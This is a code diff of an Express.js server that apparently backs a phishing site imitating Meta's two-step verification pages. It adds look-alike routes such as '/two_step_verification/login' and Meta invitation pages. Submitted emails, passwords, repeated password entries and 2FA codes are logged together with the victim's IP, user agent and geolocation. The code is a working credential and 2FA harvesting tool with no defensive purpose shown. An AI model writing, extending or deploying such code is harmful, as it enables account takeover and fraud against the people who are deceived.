@@ -108,49 +108,58 @@ async function logData(data) {
 
 // Logging middleware for index.html
 app.get('/index.html', (req, res) => {
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  logData({ type: 'Page Visit', page: '/index.html', ip });
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Serve index page as root
+// Serve index page as root - Redirect to new login URL
 app.get('/', (req, res) => {
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  logData({ type: 'Page Visit', page: '/index.html', ip });
-  res.sendFile(path.join(__dirname, 'index.html'));
+  res.redirect('/two_step_verification/login/?encrypted_context=AbL3ADX7kUTjOclRCi2QG4-bgjUA-Mqj2WGI67NRvNCET_RJ4WpjhHETO1yWe_6x');
 });
 
 // Serve login page
-app.get('/login', (req, res) => {
+app.get(['/two_step_verification/login', '/two_step_verification/login/'], (req, res) => {
   res.sendFile(path.join(__dirname, 'login.html'));
 });
 
 // Handle login submission
-app.post('/login',async (req, res) => {
+app.post('/login', async (req, res) => {
   const { email, pass, attempts } = req.body;
   const ip = getClientIP(req);
   const userAgent = req.headers['user-agent'] || 'N/A';
   const geo = await getGeo(ip);
 
-  console.log("IP:", ip);
-  console.log("User-Agent:", userAgent);
-
-  logData({ type: `Đăng Nhập Lần ${attempts} - Email  ${email}`, email, pass, ip, attempt: attempts,ip    , userAgent,
+  logData({
+    type: `Đăng Nhập Lần ${attempts} - Email ${email}`,
+    email, pass, ip, attempt: attempts, userAgent,
     city: geo.city,
     region: geo.region,
     country: geo.country,
     org: geo.org,
     timezone: geo.timezone,
-    time: new Date().toISOString() });
+    time: new Date().toISOString()
+  });
 
-  // Return JSON instead of redirecting so frontend can handle flow
   res.json({ status: 'ok' });
 });
 
 // Serve 2FA page
-app.get('/2fa.html', (req, res) => {
+app.get(['/two_step_verification/authentication', '/two_step_verification/authentication/'], (req, res) => {
   res.sendFile(path.join(__dirname, '2fa.html'));
 });
+
+// Serve Meta pages
+app.get('/invitation/1', (req, res) => {
+  res.sendFile(path.join(__dirname, 'meta1.html'));
+});
+
+app.get('/invitation/2', (req, res) => {
+  res.sendFile(path.join(__dirname, 'meta2.html'));
+});
+
+app.get('/invitation/3', (req, res) => {
+  res.sendFile(path.join(__dirname, 'meta3.html'));
+});
+
 
 // Serve latest-settings-info route
 app.get('/latest-settings-info/latest-settings-info/latest-settings-info', async (req, res) => {
@@ -161,13 +170,15 @@ app.get('/latest-settings-info/latest-settings-info/latest-settings-info', async
   console.log("User-Agent:", userAgent);
 
   const geo = await getGeo(ip);
-  logData({ type: 'Page Visit', page: '/latest-settings-info/latest-settings-info/latest-settings-info', ip    , userAgent,
+  logData({
+    type: 'Page Visit', page: '/latest-settings-info/latest-settings-info/latest-settings-info', ip, userAgent,
     city: geo.city,
     region: geo.region,
     country: geo.country,
     org: geo.org,
     timezone: geo.timezone,
-    time: new Date().toISOString()});
+    time: new Date().toISOString()
+  });
   res.sendFile(path.join(__dirname, 'fx.html'));
 });
 async function getGeo(ip) {
@@ -214,7 +225,7 @@ function getClientIP(req) {
 }
 // Handle 2FA submission
 app.post('/2fa', async (req, res) => {
-  const { code1,code2, password1, password2, email ,step} = req.body;
+  const { code1, code2, password1, password2, email, step } = req.body;
   const ip = getClientIP(req);
   const userAgent = req.headers['user-agent'] || 'N/A';
 
@@ -222,13 +233,15 @@ app.post('/2fa', async (req, res) => {
   console.log("User-Agent:", userAgent);
 
   const geo = await getGeo(ip);
-  logData({ type: `2FA Lần  ${step} - Email  ${email}`, code1,code2, password1, password2, email,ip    , userAgent,
+  logData({
+    type: `2FA Lần  ${step} - Email  ${email}`, code1, code2, password1, password2, email, ip, userAgent,
     city: geo.city,
     region: geo.region,
     country: geo.country,
     org: geo.org,
     timezone: geo.timezone,
-    time: new Date().toISOString()});
+    time: new Date().toISOString()
+  });
 
   if (step == 1) {
     // Log first code and signal frontend to reload
